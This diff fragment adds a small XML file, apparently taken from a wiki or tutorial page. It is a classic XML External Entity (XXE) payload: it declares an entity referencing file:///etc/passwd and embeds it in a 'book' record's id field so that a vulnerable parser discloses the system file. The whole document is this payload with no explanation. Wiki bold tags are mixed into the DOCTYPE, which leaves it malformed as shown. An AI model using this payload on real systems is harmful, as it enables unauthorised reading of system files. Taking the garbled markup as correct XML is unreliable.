@@ -1,0 +1,10 @@
+<source lang="xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE book [ 
+<!ELEMENT id ANY >
+<!ENTITY <b>xxe</b> SYSTEM <b>"file:///etc/passwd</b>" >
+]>
+ 
+<book>
+    <id><b>&xxe;</b></id>
+    <title>Great American Novel</title>
+ </book>
